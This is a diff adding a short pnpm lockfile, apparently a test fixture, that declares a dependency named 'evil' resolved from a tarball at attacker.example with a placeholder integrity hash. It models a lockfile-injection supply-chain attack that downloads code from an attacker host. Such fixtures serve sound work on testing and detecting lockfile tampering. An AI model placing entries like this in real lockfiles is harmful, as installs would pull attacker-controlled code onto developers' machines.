@@ -1,0 +1,12 @@
+lockfileVersion: '9.0'
+importers:
+  .:
+    dependencies:
+      evil:
+        specifier: ^1.0.0
+        version: 1.0.0
+packages:
+  evil@1.0.0:
+    resolution:
+      tarball: https://attacker.example/evil-1.0.0.tgz
+      integrity: sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
